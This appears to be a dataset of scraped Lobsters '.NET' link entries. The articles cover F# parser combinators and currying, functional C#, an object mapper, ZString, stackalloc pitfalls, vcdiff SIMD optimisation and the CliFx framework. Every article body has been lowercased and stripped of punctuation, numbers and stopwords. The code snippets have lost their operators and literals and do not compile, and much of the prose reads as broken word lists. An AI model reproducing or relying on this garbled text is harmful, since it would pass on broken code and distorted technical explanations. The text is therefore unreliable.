criterion baked function match succeeds parsing function return success matched item remaining input match fails parsing function return failure reason failure finally saw way parser could combined make new parser andthen orelse choice listing parser library far complete listing parsing library far line code source code displayed also available gist open system type represents successfailure parsing type result success failure string type wrap parsing function type parser parser string result string parse single character let pchar chartomatch define nested inner function let innerfn str stringisnullorempty str failure input else let first str first chartomatch let remaining str success chartomatch remaining else let msg sprintf expecting c got c chartomatch first failure msg return wrapped inner function parser innerfn run parser input let run parser input unwrap parser get inner function let parser innerfn parser call inner function input innerfn input combine two parser andthen b let andthen let innerfn input run input let run input test result failuresuccess match failure err return error failure err success run remaining input let run test result failuresuccess match failure err return error failure err success combine value pair let newvalue return remaining input success newvalue return inner function parser innerfn infix version andthen let andthen combine two parser orelse b let orelse let innerfn input run input let run input test result failuresuccess match success result success return original result failure err failed run input let run input return result return inner function parser innerfn infix version orelse let orelse choose list parser let choice listofparsers listreduce listofparsers choose list character let anyof listofchars listofchars listmap pchar convert parser choice summary post created foundation parsing library simple combinators next post build create library many combinators source code post available gist information interesting using technique production sure investigate fparsec library f optimized realworld usage information parser combinators general search internet haskell library influenced fparsec post example using fparsec try one post understanding parser combinators series understanding parser combinators comment please enable javascript view comment powered disqus blog comment powered
72,Lobsters,dotnet,"C#, F#, .NET programming","Your C# is already functional, but only if you let it",http://hmemcpy.com/2020/03/your-csharp-is-already-functional/,c already functional let,tweeted fizzbuzz new feature c keep using expressionoriented programming enterprise fizzbuzz c java python functional,day ago tweeted c code snippet showing fizzbuzz implementation using new feature c tweet went viral kid say several people admiring terse functional aspect others asked writing f first place year since last wrote c exposed functional programming clearly affected write code today snippet wrote seems neat natural however people expressed concern feel like c code look functional keep using depending ask word functional mean different thing different people rather debating semantics like offer explanation tiny fizzbuzz snippet feel functional first let unpack snippet tweak image public static void main string args string fizzbuzz int x x x switch true true fizzbuzz true fizz true buzz xtostring enumerablerange select fizzbuzz tolist foreach consolewriteline novelty lie using tuple pair capture result equation together x x allows using pattern matching deconstruct tuple examine value together none case match default case always match returning string value number however none many functional feature used snippet including linqstyle foreach loop make approach functional make functional fact except final printing console method used program expression expressionoriented programming simply put expression question always answer programming term expression combination constant variable operator function evaluated runtime compute return value illustrate difference statement let write common c solution fizzbuzz public static void main string args foreach int x enumerablerange fizzbuzz x public static void fizzbuzz int x x x consolewriteline fizzbuzz else x consolewriteline fizz else x consolewriteline buzz else consolewriteline x obviously snippet could tweaked remove duplication doubt anyone would argue look like c yet upon closer inspection fizzbuzz method reveals several design issue even program simple fizzbuzz first program violates single responsibility principle mix business logic calculating output value based number act printing value console consequence violates dependency inversion principle tightlycoupling console output finally reuse test program isolation without introducing indirection trivial program like fizzbuzz would never taken extreme easy end enterprise fizzbuzz problem stated solved separating act producing fizzbuzz value printing console even without using fancy language feature simplest act returning value caller free u responsibility something value public static string fizzbuzz int x x x return fizzbuzz else x return fizz else x return buzz else return xtostring might look like dramatic change could implemented various way using naive way illustration thing happened fizzbuzz method expression given numeric input produce string output responsibility sideeffects making pure function tested reused without additional dependency setup caller function free whatever want result responsibility lie essence functional programming functional code made expression producing value returning caller expression usually standalone completely specified input parameter top entry point sometimes known end world value gathered interacted upon rest world objectoriented jargon sometimes called onion architecture port adapter pure core comprised business logic imperative outer shell responsible interaction external world c java python functional using expression instead statement small core nearly programming language today c evolved time introduce feature make easier work expression linq expressionbodied method pattern matching feature oftentimes called functional language f feature used time allowing data flow insideout functional language haskell make nearly impossible anything expression fact style programming encouraged c team recent talk given ndc london bill wagner urge change imperative habit embrace modern technique video c imperative language like java used functionally requires high level diligence language make functional style exception norm urge explore language expressionoriented programming default making firstclass citizen
73,Lobsters,dotnet,"C#, F#, .NET programming",On currying in F#,https://github.com/dsyme/fsharp-presentations/blob/master/design-notes/on-currying.md,currying f,chittychat twitter thread currying f time f designed recommend use currying expert f recommendation understand currying useful functional programming apis appendix function value interop core semantic desugared form f expression f tast expression form function value curried local tupled local function declaration module curried function declaration module tupled function declaration module net interop call,please submit pr spot mistake would like add substantive comment chittychat twitter thread currying f weekend asked andy gocke historychoices inclusion currying partial application f design happy discus quick note first historical perspective come via f ocaml edinburgh ml raw core fp code let let let technical detail mostly ocaml lot extra detail mechanism work wrt object programming subsumption quotation skip added note compiled form curried tupled function value declaration end note time f designed stronglytyped starting point java c ocaml standard ml haskell real integration oo fp available even scala prototype like pizzagj c even viable function value always evolutionary approach necessary started c leading c generic ocaml leading f ocaml starting point currying partial application comprehend andy desire see currying partial application lose hallowed status amongst stronglytyped fp aficionado basic criticism bias last argument valid also valid criticism creates instability irregularity basic coding pattern eg team member using tupled argument using curried argument even basically code first order see play f code practice find flipping many parameter involved one problem bias last parameter argument similar criticism made object programming notation bias first parameter yet prof perfectly effective practice syntactic mechanism first last parameter covered callsites process diminishing return help explain currying persistently present haskell ocaml elm purescript like object programming notation highly compact bunch coding pattern toolbox kind get used thing like get entrenched right wrong design principle necessarily dominate people get used particular notation said think could theory remove currying partial application f replace design away partial application altogether characterised something like xmap x listmap x callsites always saturated partial application language like would still look feel much like modern f code true f time f coding developed stable style distinct ocaml etc would fit badly breaking change theory reasonable stable starting point hybrid oofp language surprised gradually becomes quite standard amongst language somehow technical problem mechanism like mostly nesting evaluation order like cutcute proposal scheme people float suggestion like f nothing quite stuck think another pair parenthesis available u ascii burn anyway f component design guideline recommend use currying object api design trying push implementation code functional programming idiom also remove function like curry uncurry standard library iirc expert f chapter also wrote fair bit suggesting currying used limited circumstance bias amongst argument likely known unvarying callsites onus author function predict used implementation code ok wrote expert f recommendation understand currying useful functional programming apis currying name used function take argument iterated form function partially applied example following function curried let f x z x z let f x z x z guideline use currying use use currying freely rapid prototyping scripting saving keystroke useful situation use currying partial application function highly likely give useful residual function see chapter use currying partial application function necessary permit useful precomputation see chapter note however partialapplicationforprecomputation design pattern rarely used f coding ever avoid using currying vanilla net apis apis used net language using currying place argument order least varying varying make partial application function useful lead compact code example listmap curried function argument first typical program usually applies listmap handful known function value many different concrete list value likewise saw chapter recursive function used traverse tree structure traversal often carry environment environment change relatively traverse subtrees structure bind variable reason environment first argument using currying consider importance pipelining operator example place function argument first object argument last f also us currying letbound binary operator combinators let divmod n let map f x let fold f z x however see chapter define operator static member type curried aside noticeable currying implicitpervasive laziness fp technique moving hindleymilner algol language appendix function value interop core semantic desugared form f expression core semantic desugared f representation expression thing effectively system f interop net interop f moduleoo declaration see detail f quotation f tast expression form detail function value curried local int int int type fsharpfunc int fsharpfunc int int arity local known statically except perhaps optimization phase expression becomes load expression becomes expression becomes actually static method fsharpfunc invokefast note follows ocaml evaluating making call thus distinction former becomes invoke absence optimization information note hidden type test check support optimizedclosuresfsharpfunc twocurriedargument entry point likewise etc closurecreation point allocating fun x creating instance optimizedclosuresfsharpfunc twoargument curried entry point fun x side effect two argument mean allocationfree call twoargument curried function cost type test looping code make explicit lift check manually tupled local int int int static compiled type fsharpfunc tuple int int int arity local known statically except perhaps optimization phase expression becomes load expression becomes load invoke expression becomes load invoke tuple allocationfree call function unless optimization learns something function declaration module compiled form curried function declaration module let x x public static int int x int arity known statically expression becomes fun expression becomes let fun expression becomes compiled form tupled function declaration module let x x also public static int int x int arity known statically expression becomes fun expression becomes let expression becomes skip function declaration class suffice say typically become instance method net interop call overall moduleoointerop part f approximating illusion uniformity sea nonuniform declarationlevel construct class module function method property net interop type provider void generic lifting uniform expression level lot could said basic
75,Lobsters,dotnet,"C#, F#, .NET programming",Building a Blazing Fast Object Mapper with C# .NET Core 3.1,https://www.twilio.com/blog/building-blazing-fast-object-mapper-c-sharp-net-core,building blazing fast object mapper c net core,video series understanding case study project automapper prerequisite net core sdk visual studio visual studio code git roslyn code analyzer companion repository initializing case study project mapping property two object propertyinfo,objecttoobject mapping used mostly copying property one object another typically transforming object one type another many use case example object transformation help prevent overposting attack succeeding intermediating apis user interface exposed world private data model backend server build minimalistic objecttoobject mapper c net core without writing lot code post show various approach one used production online action game massive load also professional mapper available come many useful feature minimalistic code provide post show implement automapper one popular objecttoobject mapping library mapping technique demonstrated originally developed time c reflection even costly performance standpoint today still strong motivation find faster way mapping approach demonstrated post chart course short technical journey simple reflectionbased code dynamic code generation search better performance travel path opportunity see difference performance various approach performance changed time would like see full integration twilio apis net core application checkout free video series separate blog post tutorial give full run many apis understanding case study project following coding exercise create four different way implementing object mapper also implement popular automapper library provides suite highlyoptimized object mapping tool compare performance approach create test executes implementation million time display elapsed time prerequisite follow along coding exercise presented post need following tool net core sdk sdk download includes net cli net runtime visual studio visual studio code ide text editor choice git want clone project github net core crossplatform technology code post run window macos linux addition technical resource working knowledge c including abstract class generic type linq reflection net core including linq reflection apis creating running net core console application v v code net cli also helpful exposure roslyn code analyzer companion repository available github initializing case study project create new net core console application called objecttoobjectmapper mapping property two object first step object mapping find matching property two object use propertyinfo class systemreflection api also take step better prepared creating class propertymap hold information matching property add new c class file project root folder named propertymapcs replace existing content class file following code
76,Lobsters,dotnet,"C#, F#, .NET programming",ZString — Zero Allocation StringBuilder for .NET Core and Unity,https://medium.com/@neuecc/zstring-zero-allocation-stringbuilder-for-net-core-and-unity-f3163c88c887,zstring zero allocation stringbuilder net core unity,zstring zero allocation stringbuilder net core unity zstring http githubcomcysharpzstring messagepack c string type configuration generation mastermemory string deduplication concatenation stringconcat stringbuilder spanformatter ispanformattablereferences format readonlyspan char composite formatting direct writing without allocate string readonlyspan byte summary,zstring zero allocation stringbuilder net core unityfor net core unity released library called zstring enables memory allocation zero string generation besides introducing zstring article also deeply disassembles explains c string explains string complexity pitfall necessity zstringhttps githubcomcysharpzstringi author highperformance serializers messagepack c one performance enthusiaststhe table show performance measurement simple string concatenation called x x z z x x z zzstringconcat x x z z stringformat x z x z zstringformat x z x z new stringbuilder append tostring zstringcreatestringbuilder append tostring graph show respective memory allocation amount speed case zstring allocation string concatenation also easy api use stringbuilder stringformat stringconcat stringjoin replaced isstring type configuration generationthe c string type internally byte stringas normal object object header allocated heap memory way string basically generated new string stringbuildertostring encodinggetstring etc also finally call new string allocate new stringto precise net internal method directly write string memory allocated internal method called stringfastallocatestring int length method public however net standard add stringcreate tstate int length tstate state spanaction char tstate action method calling direct writing new string memory possiblethe string generated new string allocated different memory space even string value however constant string acquires fixed reference applicationsharing space called intern poolif want acquire intern pool stringintern method used intern method acquired intern pool exist registered registered reference returnedsince memory registered intern pool deleted probably difficult use well however mastermemory inmemory database developed company string data expanded memory masterdata persisted application lifetime using feature string internalizedalso net core runtime proposal function called string deduplication delete string duplicated gc convert single reference however still take longer implement concatenation stringconcatthe c compiler specialized processing string concatenation converted stringconcatsince x x z z concatenation converted stringconcat string value case visual studio version c compiler detail later word result followsoptimizing concatenation c compiler may obtain different result current one past one example visual studio c compiler result int x string int z stringconcat xtostring ztostring however visual studio c compiler stringconcat object x object z concatenated nonstring parameter object overload used therefore struct boxing occurs unity used must note result differ depending version c compiler bundled unityas concat overload three four parameter optimized avoid params array allocationstringbuilder spanformatter stringbuilder class char temporary buffer append used write buffer tostring generates final stringwhen want concatenate multiple string avoid use new string generated stringbuilder avoids generating temporary new string instead copy char need watch sbappend current hp enemyhp etc written create temporary string concatenated mean avoid using appending numeric type etc behavior different net standard unity etc net standard net core etc net standard simply add tostring result word although allocation created string creation net standard ispanformattabletryformat writes directly buffer without going string ispanformattable internal however checking ispanformattablereferences see type implementing direct writingeven unity environment string allocation numeric type added avoided zstring net standard zstring us implemented tryformat net standard zstring us ported tryformat methodthe api almost stringbuilder however must enclosed using since createstringbuilder return value struct allocation stringbuilder heap avoided also since char buffer used internal writing obtained arraypool buffer allocation avoided however necessary return buffer using also zstringconcat us internally since generic overload parameter provided numeric type string conversion allocation completely avoided even unity environmentformat readonlyspan char since string interpolation converted stringformat overhead however since stringformat parameter accept object boxing occursalso stringbuilderappend net standard string conversion allocation also occurslike zstringconcat zstringformat generic overload parameter even net standard environment implementing direct conversion tryformat zero allocation achieved stringformat support composite formatting compositeformatted string expressed index alignment formatstring used format date set number digit numeric valueszstringformat support formatstring alignmentin end compositeformatted string sampled given tryformat let look definition ispanformattablenote instead string format readonlyspan char format format string obtained string analyzed partial slice take string example divided x slice x copied given format string tryformat way expressing format string readonlyspan char string allocation avoidedas explained beginning since string actually byte string expressed readonlyspan char span char unlike string readonlyspan char enables partial acquisition use char therefore easy use pooland providing api accepts string readonlyspan char would make easy improve performance however due ref struct retained field net standard provide implicit conversion string readonlyspan char therefore usability adversely affected necessary keep mind designdirect writing without allocate stringzstring internal implementation zero allocation string generated end allocated apis request string however applicable library api accepts something string final string generation also avoided completely zero allocation attained example since unity textmeshpro api called setchararray char sourcetext int start int length given directly string generation avoidedeven net core apis accept readonlyspan char increasing way approach avoid string application overall performance readonlyspan byte network file io many case data requested end string byte case stringbuildertostring char writing string generation encoding quite useless written directly overhead zero therefore zstring provides methodwe expect effectively used generating matrix data sent network need frequently written effectively used template engine backendto write directly numeric type used tryformat method write span byte word like string expressing readonlyspan char express readonlyspan byte summarystring basic type since basic type look simple many special operation using normally impossible avoid pitfall zstring offer api similar stringstringbuilder therefore instead thinking complicated detail given designed simply replace give best performance iwould happy tried
77,Lobsters,dotnet,"C#, F#, .NET programming",Dos and Don'ts of stackalloc,https://vcsjones.dev/2020/02/24/stackalloc/,do donts stackalloc,post use variable allocation length use constant allocation size use stackalloc nonconstant loop allocate outside loop allocate lot stack conservatively use stack assume stack allocation zero initialized initialize required summary,net core small wellreceived feature ability safely allocate segment data stack using stackalloc used span span stackalloc required unsafe context unsafe byte data stackalloc byte use unsafe along little number apis net could work pointer enough deter lot people using result remained relatively niche feature introduction span mean done without unsafe context span byte data stackalloc byte net team also working diligently add span apis make sense appeal possibility use stackalloc stackalloc desirable performance sensitive area used place small array used advantage allocate heap thus apply pressure garbage collector stackalloc general purpose dropin array limited number way post explain well enough require use span recently vented bit stackalloc twitter one twitter specifically community fast embrace without discussing welldocumenting stackalloc sharp edge going expand make argument stackalloc still unsafe requiring thought used use variable allocation length large risk using stackalloc running stack space ever written method recursive went deep eventually receive stackoverflowexception stackoverflowexception bit special one exception caught stack overflow occurs process immediately exit allocating much stackalloc effect cause stack overflow process immediately terminates particularly worrisome allocation length determined user input span char buffer stackalloc char userinputlength nt allows user take process effective denialofservice using constant also reduces risk arithmetic overflow mistake currently net core clr interprets amount allocated unsigned integer mean arithmetic flow may result stack overflow span byte b stackalloc byte userinput nt use constant allocation size instead better use constant value stackalloc always immediately resolve ambiguity much allocated stack span char buffer stackalloc char better allocated buffer use span slice funtionality adjust correct size span char buffer stackalloc char span char input bufferslice userinputlength use stackalloc nonconstant loop even allocate fixed length amount data stack loop dangerous well especially number iteration loop make driven user input int userinput nt span char buffer stackalloc char also cause denial service since allows someone control number stack allocation though length allocation allocate outside loop span char buffer stackalloc char better int userinput something buffer allocating outside loop best solution safer also better performance allocate lot stack tempting allocate much nearly possible stack span byte data stackalloc byte nt may find run fine linux fails window stack overflow different operating system architecture environment different stack limit linux typically allows larger stack window default hosting scenario ii worker process come even lower limit embedded environment may stack kilobyte conservatively use stack stack used small allocation much depends size element allocated also desirable allocate many large structs either prescribe anything specific anything larger kilobyte point concern allocate heap depending much need typical pattern might const int maxstacksize span byte buffer userinput maxstacksize new byte userinput stackalloc byte maxstacksize span byte data bufferslice userinput allocate stack small amount still constant amount large use heapallocated array pattern may also make easier use arraypool choose also guarantee returned array exactly requested size const int maxstacksize byte rentedfrompool null span byte buffer userinput maxstacksize rentedfrompool arraypool byte sharedrent userinput stackalloc byte maxstacksize use data span byte data bufferslice userinput return pool rented rentedfrompool object using arraypool think carefully clearing clearing array arraypool byte sharedreturn rentedfrompool cleararray true assume stack allocation zero initialized normal us stackalloc result zeroinitialized data behavior however guaranteed change depending application built debug release content method therefore assume element stackalloced span initialized something default example span byte buffer stackalloc byte sizeof int byte lo byte hi buffer lo buffer hi dont depend element zeroinitialized int result buffer case might expect result every time however stackalloc zero initialize buffer content upperhalf integer expected behavior always observed debug build likely see stackalloc zeroinitializes content every time whereas release build may find content stackalloc uninitialized soon developer able explicitly skip zeroinitializing stackalloc content skiplocalsinit feature currently whether stackalloc default initialized roslyn feature allow explicit control skipping stack allocation initialization initialize required item read stackalloced buffer explicitly assigned use clear explicitly clear entire span initialize default span byte buffer stackalloc byte sizeof int bufferclear explicit zero initialize byte lo byte hi buffer lo buffer hi int result buffer though explicitly covered post advice applies array rented arraypool summary summary stackalloc need used care failing result process termination denialofservice program web server running
78,Lobsters,dotnet,"C#, F#, .NET programming",Adventures in C# Optimization,https://snowflakepowe.red/blog/adventures-in-c-sharp-optimization-2020-02-15/,adventure c optimization,game save file api deltaq openvcdiff metricvcdiff tackling obvious stuff vectorization take one vectorizing optimized version looking intrinsic corresponds method call furious googling get horizontal sum vector vectorizing rolling hash algorithm optimization setting sight back onto squeezing every last drop overhead getting span tight loop completely negates gain using final note arrayfill github nuget deltaq,part new game save file api working needed library binary diffs c usually could grab library nuget surprised find deltaq bsdiff implementation available bsdiff great executables type data ideal save file early game system usually change little wanted diff save file base like git game save least experience traditional algorithm rom vcdiff using wanted use algorithm thankfully someone write port openvcdiff c metricvcdiff reading thanks much metric end story would vcdiff came box slow molasses proper benchmark sort long take original vcdiff library encode diff file second insane amount time especially tool like xdelta fraction time without option sat took look cut hopefully become fast c c implementation vcdiff tackling obvious stuff see trace time taken encodecopyforbestmatch function using dottrace hotspot functionality seems lot time taken bytestreamreader particularly readbyte method position setter could taking much time bytestreamreadersetposition look like public long position get set readall value offset value buffercanread value bufferposition value bytestreamreader keep internal list byte cache already read underlying stream buffer case filestream also another method bufferall copy stream chunk internal cache always called access point ever setting position underlying filestream simplying adding else correct place save u nearly second time next obvious thing tackle readbyte thus begin deep dive span memory span memory first thing replace anything used byte array copy memory anything used multiple byte array single byte array memory window across single array help much least byte copy input stream allocated pretty much memory handle form memory passed around instead copying new array however look like time spent bound checking bytestreamreader fixing span using memory byte span bytebuffer point figured could use bytebuffer place bytestreamreader since bytestreamreader already buffer entire stream memory focus optimizing bytebuffer memory pin api allows u get raw pointer address fix safely without gc moving around lifetime object surely dereferencing raw pointer fastest way would get rid overhead memory span public byte readbyte offset length throw new exception trying read past end buffer unsafe return byteptr offset small improvement obvious get better speed need reduce amount time readbyte called vectorization take one systemnumericsvector matchingbytestotheright function obvious place start looking bytesfound maxbytes sindex srclength tindex trglength break sourcedatacanread break byte lb sourcedatareadbyte targetcanread break byte rb targetreadbyte lb rb break tindex sindex bytesfound c support autovectorization fairly recently net core exposed simd intrinsics form systemruntimeintrinsics api well systemnumericsvector api little bit widely supported instead requiring also bit easier use started loop trivially vectorizable using systemnumericsvector bytesfound maxbytes vectorsize bytesfound vectorsize tindex vectorsize sindex vectorsize var lb sourcereadbytes vectorsize span var rb targetreadbytes vectorsize span lblength vectorsize rblength vectorsize sourceposition vectorsize targetposition vectorsize break var lv new vector byte lb var rv new vector byte rb vectorequalsall lv rv continue sourceposition vectorsize targetposition vectorsize break provided huge time saving cutting time second vectorizing matchingbytestotheright like possible without first using span byte since peekbytes previously implemented byte array copy time load slice vector would dominated time copy array another heapallocated array armed newfound confidence set try optimize stuff even basically three main step taking substantial amount time calculating checksum output diff rolling hash used hash individual block data rabinkarp hash searching individual block chunk data similar already vector revisit later article well vectorizing systemruntimeintrinsics hashing function seemed like easy target vectorization never touched simd programming since wellknown algorithm plenty implementation figured could grab one shelf rewrite c luck would chromium us optimized version converting c matter looking intrinsic corresponds method call systemruntimeintrinsics unfortunately used sse specific instruction vector support mean consumer would able take advantage vectorized routine turn becomes much problem see later version gave nice speedup whenever checksum involved compared scalar implementation also trivial convert furious googling get horizontal sum vector along way added support checksum format function name changed computing hash went pretty good amount saving much else say since essentially copy paste completely honest still understand exactly implementation work verified scalar path vectorizing rolling hash algorithm next target set sight addallblocks method took see two screenshots ago original author took algorithm straight c version using direct pointer access seemed speed little bit private const int kmult private const int kbase public ulong hash readonlymemory byte byte unsafe fixed byte span bytesspan byteslength return byteslength return span kmult ulong h span ulong kmult span int byteslength h h kmult span kbase return h compared good better vectorize need math rolling hash algorithm implementation hash used rabinkarp string search algorithm know first solved recurrence manually h represented following sum c kmult si element array one important observation never exceeds block size used calculate diff default testing block size use precalculate power kmult load simd vector vertical multiply element span math done mod done using binary operation first wrote scalar implementation algorithm using precomputed power kmult uint c int kmultfactors int c c c kmult kbase int len spanlength int len int index len ulong c uint kmultfactors index h c span kbase simd implementation became much obvious show implementation shorter ulong h int vps int zero int vkbase kbase int vshuf fixed byte buf span int j len len j len int cv kmultfactorsptr j cv cv vshuf byte qv buf int sv qv vps vps cv sv vkbase int vps vps h return h kbase optimization rolling hash operation even show trace using smaller block size least double encoding work needed show clearer picture much faster vectorized version remember double amount work needed done compared tested previous implementation least twice fast naive implementation setting sight back onto matchingbytes despite saving time still pretty bad compared time benchmarked native c implementation openvcdiff encoding time still four time slower native code know expect much jitted language gc still felt like give obvious problem bottlenecked span unfortunately vector work span order load vector without overhead span needed able load memory address using intrinsics like provided c case mean raw pointer access hashing example used fixed get pointer span want completely forgo initializing span first place remember optimizing readbyte used pin get pointer underlying byte array bytebuffer since bytebuffers created destroyed internally encoder guarantee lifetime bytebuffer longer lifetime blockhash matchingbytes stuff therefore safe expose pointer sptr sourcedangerousgetbytepointer tptr targetdangerousgetbytepointer srclength sindex trglength tindex bytesfound maxbytes bytesfound tindex sindex var lv sptr sindex var rv tptr tindex lv rv eqmask continue break much simpler code systemnumericsvector overhead loading span byte completely eliminated matchingbytes take negligible time compared vector version squeezing every last drop still better though instead fetching pointer bytebuffers every time matchingbytes called would better safer term lifetime management pointer passed call site way save method call sure leave dangling pointer behind well turn vectorized version barely save time still le instruction mean le time point idea else make faster encoding time respectable time compared around benchmarked unscientifically using measurecommand interesting though using raw point affect scalar path removed systemnumericsvector code completely repeatedly accessing span memory much overhead deal turn overhead getting span tight loop completely negates gain using vector matchingbytestoright using completely scalar path running support intrinsics notice performing better implementation systemnumericsvector shown bit earlier final note point code look like c c guess want speed passing pointer around way achieve impressed ease span memory make easy manage pointer lifetime act view contiguous memory disappointed fact still zerocost tight loop repeatedly grabbing span already allocated memory cost way much useful performance requirement choice rely unsafe code pointer arithmetic also lot microoptimizations talk much article like using field instead property since property incurred small nonnegligible cost access arrayfill instead looping array fill also gave small time saving considering second encoding time starting think encoding time highly respectable especially considering overhead garbage collector jit compiler fun detour take week taught lot take advantage simd intrinsics c find source code work github uncreatively named vcdiff licensed apache license also find vcdiff nuget version number since changed api twice original source code support encoding decoding uncompressed openvcdiff format vcdiff patch well plain nonchecksummed vcdiff time would liked proper benchmark deltaq suspect though vcdiff perform quite lot better due use abuse unsafe pointer arithmetic simd intrinsics
81,Lobsters,dotnet,"C#, F#, .NET programming",Declarative framework for building command line interfaces,https://github.com/Tyrrrz/CliFx,declarative framework building command line interface,clifx download nuget feature screenshots usage quick start binding argument parameter option argument syntax value conversion multiple command reporting error graceful cancellation dependency injection testing debug preview mode environment variable benchmark etymology,clifx clifx simple use yet powerful framework building command line application primary goal completely take user input layer letting forget infrastructure instead focus writing application framework us declarative classfirst approach defining command avoiding excessive boilerplate code complex configuration download nuget dotnet add package clifx feature complete application framework argument parser requires minimal amount code get started configuration via attribute handle conversion various type including custom type support multilevel command hierarchy expose raw input output error stream handle binary data allows graceful command cancellation print error route exit code exception provides comprehensive colorful autogenerated help text highly testable easy debug come builtin analyzer help catch common mistake work net standard net core net framework external dependency screenshots usage quick start turn application command line interface need change program main method delegate execution cliapplication public static class program public static async task int main await new cliapplicationbuilder addcommandsfromthisassembly build runasync code create run cliapplication resolve command defined calling assembly using fluent interface provided cliapplicationbuilder also easily configure aspect application order add functionality however need define least one command command essentially entry point user interact application think something similar controller aspnet core define command create new class implement icommand interface annotate command attribute command public class helloworldcommand icommand public valuetask executeasync iconsole console consoleoutputwriteline hello world return empty task command executes synchronously return default implement icommand class need define executeasync method method get called clifx user run application facilitate asynchronous synchronous execution method return valuetask since simple command executes synchronously put return default end asynchronous command however would use asyncawait keywords instead parameter method take instance iconsole abstraction around system console use abstraction place would normally interact systemconsole order make command testable basic setup user execute application get greeting return box application also support builtin help version option myappexe help myapp usage myappexe option h help show help text version show version information myappexe version binding argument command configured take input command line argument need add property command annotate special attribute clifx two type argument binding parameter option parameter positional argument identified order appear option argument identified name example command calculates logarithm value us parameter option command public class logcommand icommand commandparameter description value whose logarithm found public double value get set commandoption base b description logarithm base public double base get set public valuetask executeasync iconsole console var result mathlog value base consoleoutputwriteline result return default command two input value parameter order base option name base short name b let try running help see command supposed used myappexe help myapp usage myappexe value option parameter value value whose logarithm found option b base logarithm base default h help show help text version show version information see order execute command minimum user supply value also set nonrequired base option override default logarithm base myappexe base hand user fails provide parameter get error parameter always required myappexe b missing value parameter value overall difference parameter option follows parameter identified relative order option identified two dash followed name single dash followed short name single character parameter ca nt optional option usually optional evident name configured required well parameter technically name used help text option configured use value environment variable fallback parameter option take multiple value parameter must last order avoid ambiguity option limited aspect general guideline prefer use parameter required input command ca nt work without use option nonrequired input command many required input specifying option name explicitly provides better user experience argument syntax library support argument syntax based posix standard fair nobody really know standard tool actually follow letter purpose dash space clifx using standard command line syntax specifically following example valid myapp foo bar set option foo value bar myapp f bar set option f value bar myapp switch set option switch without value myapp set option without value myapp abc set option b c without value myapp xqf bar set option x q without value option f value bar myapp set option sequence value myapp set option sequence value myapp cmd abc route command cmd assuming exists parameter abc set option without value argument parsing clifx aim deterministic possible ideally yielding result matter context contextsensitive part parser command name resolution need know command available order discern argument correspond command name argument parameter option always parsed way regardless arity actual property bound mean myapp always parsed option set multiple value even underlying property enumerable reason unseparated argument myapp ofile treated five distinct option f l e instead set file rule order argument semantically important always go like directive command name parameter option design make usage application lot intuitive predictable providing better enduser experience value conversion parameter option different underlying type standard type primitive type int bool double ulong char etc date time type datetime datetimeoffset timespan enum type converted either name value stringinitializable type type constructor accepts single string parameter fileinfo directoryinfo etc type static method parse accepts single string parameter optionally iformatprovider nullable version type decimal timespan etc collection type array type type assignable array ireadonlylist icollection etc type constructor accepts single parameter hashset list etc defining parameter enumerable type keep mind parameter must last order option hand nt limitation example command arraybacked parameter command public class filesizecalculatorcommand icommand fileinfo stringinitializable ireadonlylist assgined array value property mapped sequence argument commandparameter public ireadonlylist fileinfo file get set public valuetask executeasync iconsole console var totalsize filessum f flength consoleoutputwriteline total file size totalsize byte return default myappexe total file size byte command using option list file instead command public class filesizecalculatorcommand icommand commandoption file public ireadonlylist fileinfo file get set public valuetask executeasync iconsole console var totalsize filessum f flength consoleoutputwriteline total file size totalsize byte return default myappexe file total file size byte multiple command complex command line application may single command order facilitate different workflow even complex application may multiple level command forming hierarchy whichever case clifx take care everything need specify appropriate command name attribute default command ie command without name command public class defaultcommand icommand child default command command public class firstcommand icommand child default command command public class secondcommand icommand child firstcommand command sub public class subcommand icommand limit number command level nesting configured user execute specific command typing name argument eg myappexe p requesting help application show myappexe help myapp usage myappexe command option h help show help text version show version information command run myappexe command help show help specific command see two command listed sub immediate child default command refine help query get information myappexe help usage myappexe command option h help show help text command sub run myappexe command help show help specific command multicommand application may also choose default command use named command case running application without parameter simply print help text reporting error may noticed command clifx nt return exit code design exit code considered infrastructural concern thus handled cliapplication individual command command instead report execution failure throwing instance commandexception using exception specify message printed stderr returned exit code example command public class dividecommand icommand commandoption dividend isrequired true public double dividend get set commandoption divisor isrequired true public double divisor get set public valuetask executeasync iconsole console mathabs divisor doubleepsilon print error set exit code throw new commandexception division zero supported var result dividend divisor consoleoutputwriteline result return default myappexe dividend divisor division zero supported lastexitcode also specify showhelp parameter instruct whether show help text current command printing error command public class examplecommand icommand public valuetask executeasync iconsole console throw new commandexception something went wrong showhelp true note unix system rely unsigned integer exit code strongly recommended use value specifying exit code order avoid potential overflow issue graceful cancellation user command line application may send interrupt signal ctrlc ctrlbreak gracefully abort execution command clifx intercept signal cancel ongoing operation perform cleanup order make command cancellationaware need call consolegetcancellationtoken method return cancellationtoken trigger user issue interrupt signal note code come first call getcancellationtoken cancellationaware terminate instantly subsequent call method return token example command support cancellation command cancel public class cancellablecommand icommand public async valuetask executeasync iconsole console make command cancellationaware var token consolegetcancellationtoken execute longrunning operation await taskdelay timespanfromminutes token consoleoutputwriteline done keep mind command may delay cancellation user decides send interrupt signal first time execution forcefully terminated regardless whether command cancellationaware dependency injection clifx us implementation itypeactivator initialize command default work type parameterless constructor sufficient majority scenario however case may also want initialize command dynamically help dependency injection container clifx make really easy integrate di framework choice example would configure application use microsoftextensionsdependencyinjection aka builtin dependency container aspnet core public static class program public static async task int main var service new servicecollection register service servicesaddsingleton myservice register command servicesaddtransient mycommand var serviceprovider servicesbuildserviceprovider return await new cliapplicationbuilder addcommandsfromthisassembly usetypeactivator serviceprovidergetservice build runasync testing clifx provides convenient way write functional test application thanks iconsole interface command running production us systemconsole console interaction rely virtualconsole test validate interaction simulated environment initialize instance virtualconsole supply stream used application stdin stdout stderr nt supply however remaining stream substituted noop stub var console new virtualconsole input stdin output stdout error stderr although virtualconsole constructed kind stream time want test inmemory store simplify setup scenario clifx also provides createbuffered factory method return instance iconsole along inmemory stream later read var console stdout stderr virtualconsolecreatebuffered get text written far var stdoutdata stdoutgetstring illustrate use let look example assume want test simple command one command public class concatcommand icommand commandoption left public string left get set hello commandoption right public string right get set world public valuetask executeasync iconsole console consoleoutputwrite left consoleoutputwrite consoleoutputwrite right return default substituting iconsole write test case like integration test command level test public async task concatcommandexecutessuccessfully arrange var console stdout virtualconsolecreatebuffered var command new concatcommand left foo right bar act await commandexecuteasync console assert assertthat stdoutgetstring isequalto foo bar similarly also test entire execution endtoend like endtoend test application level test public async task concatcommandexecutessuccessfully arrange var console stdout virtualconsolecreatebuffered var app new cliapplicationbuilder addcommand concatcommand useconsole console build var args new left foo right bar var envvars new 